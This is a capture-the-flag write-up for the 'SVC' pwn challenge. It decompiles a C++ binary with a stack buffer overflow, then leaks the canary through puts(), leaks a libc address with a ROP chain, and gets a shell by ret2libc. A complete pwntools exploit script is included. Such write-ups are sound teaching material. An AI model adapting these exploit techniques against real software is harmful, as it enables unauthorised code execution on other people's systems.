# SVC (pwn)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/935b2590-7f59-4ea1-b2fd-68425cc0d408)  

Running the program we get the following:  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1a9cab2b-4b48-455e-800a-136a8b7c07a2)  

Lets look at the binary in ghidra and see what we can find out.  

## Reversing  

This is the main function  
```c

{
  basic_ostream *<<ret;
  ssize_t sVar1;
  long in_FS_OFFSET;
  int menu_choice;
  int done;
  undefined4 local_bc;
  char input_buf [168];
  long stack_canary;
  
  stack_canary = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  menu_choice = 0;
  done = 1;
  local_bc = 0;
  while (done != 0) {
    <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
    std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    <<ret = std::operator<<((basic_ostream *)std::cout,"[*]SCV GOOD TO GO,SIR....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
    std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    <<ret = std::operator<<((basic_ostream *)std::cout,"1.FEED SCV....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    <<ret = std::operator<<((basic_ostream *)std::cout,"2.REVIEW THE FOOD....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    <<ret = std::operator<<((basic_ostream *)std::cout,"3.MINE MINERALS....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
    std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    std::operator<<((basic_ostream *)std::cout,">>");
    std::basic_istream<>::operator>>((basic_istream<> *)std::cin,&menu_choice);
    if (menu_choice == 2) {
      <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"[*]REVIEW THE FOOD...........");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"[*]PLEASE TREAT HIM WELL.....");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      puts(input_buf);
    }
    else if (menu_choice == 3) {
      done = 0;
      <<ret = std::operator<<((basic_ostream *)std::cout,"[*]BYE ~ TIME TO MINE MIENRALS...");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    }
    else if (menu_choice == 1) {
      <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"[*]SCV IS ALWAYS HUNGRY.....");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"[*]GIVE HIM SOME FOOD.......");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      <<ret = std::operator<<((basic_ostream *)std::cout,"-------------------------");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
      std::operator<<((basic_ostream *)std::cout,">>");
      sVar1 = read(0,input_buf,0xf8);
      local_bc = (undefined4)sVar1;
    }
    else {
      <<ret = std::operator<<((basic_ostream *)std::cout,"[*]DO NOT HURT MY SCV....");
      std::basic_ostream<>::operator<<((basic_ostream<> *)<<ret,std::endl<>);
    }
  }
  if (stack_canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
A couple things to note. First of all ... C++ is gross.  
Notice how the menu choice that reads in reads 248 bytes into the buffer of length 168. There is a buffer overflow there.  
Also, notice how we won't return until we select option 3. This allows us to selectively choose when to trigger the return.  

Now, before we even think of exploiting this buffer overflow we have to find a way of dealing with this stack canary.  
Looking at the Stack Layout we see the following:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1bdb22d7-81f8-437e-bb85-9ee681def82c)  
The stack canary and the input buffer are contiguous in memory.  
Since menu option 2 will use `puts()` to print our input buffer we can abuse that to leak the canary.  
C strings are terminated by a null byte. Thus, functions like `puts()` print character by character until they reach a null byte.  
Since the last first character (little endian) of the canary is always a null byte, we can overwrite that null byte and `puts()` will print the rest of the canary.  

## Exploitation  
First things first we leak the canary using the technique described above. Here it is important to use `send()` instead of `sendline()` because we don't want the `\n` to overwrite any canary bits.  
```python
io.sendline(b'1')
io.send(buffer_len*b'A' + b'X')

sleep(0.1)
io.sendline(b'2')
io.recvuntil(b'X')

canary = int.from_bytes(b'\x00'+ io.recv(7),'little')
log.success("canary is "+hex(canary))
```
**Note: the binary was behaving weird, but adding sleeps between sending and receiving data fixed it**  
Now that we know the canary we can start redirecting control flow of the program.  
We still have the problem of no syscall and NX bit, so we have to `ret2system`  to gain a shell.  
However, we need a way to bypass ASLR.  
Since PIE is disabled we can use a very common technique to print a `GOT` entry using the `PLT` entry of `puts()`. I won't go into detail as to why this works, but these tables are related to dynamic linking.  

```python
payload_base = b'A' * buffer_len + p64(canary) + b'B'* padding_len

rop = ROP(exe)
POP_RDI = rop.find_gadget(['pop rdi','ret'])[0]
main_addr = 0x00400a96
payload = payload_base + p64(POP_RDI) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(main_addr)

io.sendline(b'1')
io.send(payload)
sleep(0.1)
io.sendline(b'3')

io.recvuntil(b'TIME TO MINE MIENRALS...\n')
puts_leak = int.from_bytes(io.recvline()[:-1],'little')
log.success("leaked address of puts at "+hex(puts_leak))
```

Now we can just `ret2system`, the same as in [babyboi](DynamicLinking/csaw19_babyboi.md)

### Putting it all together
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template svc
from pwn import *
from time import sleep
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'svc')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

buffer_len = 168
canary_len = 8
padding_len = 184 - buffer_len - canary_len

# Step 1: Leak the canary
io.sendline(b'1')
io.send(buffer_len*b'A' + b'X')

sleep(0.1)
io.sendline(b'2')
io.recvuntil(b'X')

canary = int.from_bytes(b'\x00'+ io.recv(7),'little')
log.success("canary is "+hex(canary))

# Step 2: leak libc address

payload_base = b'A' * buffer_len + p64(canary) + b'B'* padding_len

rop = ROP(exe)
POP_RDI = rop.find_gadget(['pop rdi','ret'])[0]
main_addr = 0x00400a96
payload = payload_base + p64(POP_RDI) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(main_addr)

io.sendline(b'1')
io.send(payload)
sleep(0.1)
io.sendline(b'3')

io.recvuntil(b'TIME TO MINE MIENRALS...\n')
puts_leak = int.from_bytes(io.recvline()[:-1],'little')
log.success("leaked address of puts at "+hex(puts_leak))

# Step 3: ret2libc
libc.address = puts_leak - libc.sym['puts']
binsh = next(libc.search(b'/bin/sh'))
ret = rop.find_gadget(['ret'])[0]
payload = payload_base + p64(ret) + p64(POP_RDI) + p64(binsh) + p64(libc.sym['system'])

sleep(0.1)
io.sendline(b'1')
sleep(0.1)
io.sendline(payload)  
sleep(0.1)
io.sendline(b'3')  

io.clean()
io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c785d9c1-0d91-4f83-8655-9812828891be)

